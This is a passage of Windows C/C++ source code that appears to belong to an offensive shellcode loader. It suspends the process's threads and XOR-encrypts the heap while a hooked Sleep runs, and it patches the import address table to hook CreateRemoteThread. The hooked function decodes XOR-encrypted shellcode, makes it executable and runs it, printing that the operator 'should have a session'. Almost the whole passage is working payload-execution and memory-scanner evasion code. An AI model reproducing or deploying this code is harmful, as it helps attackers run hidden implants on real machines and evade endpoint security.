					if (te.th32ThreadID != targetThreadId && te.th32OwnerProcessID == targetProcessId)
					{
						HANDLE thread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
						if (thread != NULL)
						{
							SuspendThread(thread);
							CloseHandle(thread);
						}
					}
				}
				te.dwSize = sizeof(te);
			} while (Thread32Next(h, &te));
		}
		CloseHandle(h);
	}
}





/**
* For each threads of the process we resume it
*/
void DoResumeThreads(DWORD targetProcessId, DWORD targetThreadId)
{
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (h != INVALID_HANDLE_VALUE)
	{
		THREADENTRY32 te;
		te.dwSize = sizeof(te);
		if (Thread32First(h, &te))
		{
			do
			{
				if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID))
				{
					// Resume all threads EXCEPT the one we want to keep running
					if (te.th32ThreadID != targetThreadId && te.th32OwnerProcessID == targetProcessId)
					{
						HANDLE thread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
						if (thread != NULL)
						{
							ResumeThread(thread);
							CloseHandle(thread);
						}
					}
				}
				te.dwSize = sizeof(te);
			} while (Thread32Next(h, &te));
		}
		CloseHandle(h);
	}
}







/**
* This function encrypts or decrypts each busy entries on the heap with the string key
*/ 
static PROCESS_HEAP_ENTRY entry;
VOID HeapEncryptDecrypt() {
	SecureZeroMemory(&entry, sizeof(entry));
	while (HeapWalk(GetProcessHeap(), &entry)) {
		if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
			XOR((char*)(entry.lpData), entry.cbData, (char*)key, sizeof(key));
		}
	}
}






/**
*	A custom CreateRemoteThread function that can hook the original one
*	Use it with : Hookem((char*)"Kernel32.dll", (char*)"CreateRemoteThread", (PROC)HookedCreateRemThr);
*/
HANDLE HookedCreateRemThr(HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId) {
	HANDLE hThread1 = NULL;
	printf("[+]\tWe are inside HookedCreateThread. Waiting for 1 min...\n");
	DWORD old = 0;
	Sleep(60000);
	printf("[+]\t1 min elapsed. Decoding shellcode and executing payload.\nYou should have a session, wait 1 min to load extension!\n");
	XOR((char*)pRemoteCodeGlob, payload_len, (char*)key, sizeof(key));
	pVirtualProtect((HANDLE)0xffffffffffffffff, &pRemoteCodeGlob, (PULONG)&payload_len2, PAGE_EXECUTE_READ, &old);
	pRemoteThread(&hThread, GENERIC_ALL, NULL, (HANDLE)0xffffffffffffffff, (LPTHREAD_START_ROUTINE)pRemoteCodeGlob, NULL, NULL, NULL, NULL, NULL, NULL);
	return hThread;
}






void HookedSleep(DWORD dwMilliseconds) {
	printf("[+]\tWe are in hooked sleep function.\n");
	DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
	HeapEncryptDecrypt();
	pOrigSleep(dwMilliseconds);
	HeapEncryptDecrypt();	
	DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());
	printf("[+]\t5s Elapsed\n");	
}





/**
* Replace the `origFunc` function address with the `hookingFunc` function adress in the `dll` library
* This technique is named IAT hooking
*/
BOOL Hookem(char* dll, char* origFunc, PROC hookingFunc) {
	ULONG size;
	DWORD i;
	BOOL found = FALSE;
	// get a HANDLE to a main module == BaseImage
	HANDLE baseAddress = GetModuleHandle(NULL);
	// get Import Table of main module
	PIMAGE_IMPORT_DESCRIPTOR importTbl = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToDataEx(
		baseAddress,
		TRUE,
		IMAGE_DIRECTORY_ENTRY_IMPORT,
		&size,
		NULL);
	// find imports for target dll 
	for (i = 0; i < size; i++) {
		char* importName = (char*)((PBYTE)baseAddress + importTbl[i].Name);
		if (_stricmp(importName, dll) == 0) {
			found = TRUE;
			break;
		}
	}
	if (!found)
		return FALSE;
	// Optimization: get original address of function to hook 
	// and use it as a reference when searching through IAT directly
	PROC origFuncAddr = (PROC)GetProcAddress(hlpGetModuleHandle(k3rn3l), origFunc);
	// Search IAT
	PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)baseAddress + importTbl[i].FirstThunk);
	while (thunk->u1.Function) {
		PROC* currentFuncAddr = (PROC*)&thunk->u1.Function;
		// found
		if (*currentFuncAddr == origFuncAddr) {
			// make sure memory is writable
			DWORD oldProtect = 0;
			VirtualProtect((LPVOID)currentFuncAddr, 4096, PAGE_READWRITE, &oldProtect);
			// set the hook
			*currentFuncAddr = (PROC)hookingFunc;
			// revert protection setting back
			VirtualProtect((LPVOID)currentFuncAddr, 4096, oldProtect, &oldProtect);
			printf("[+]\tIAT function %s() hooked!\n", origFunc);
			return TRUE;
		}
		thunk++;
	}
	return FALSE;
}
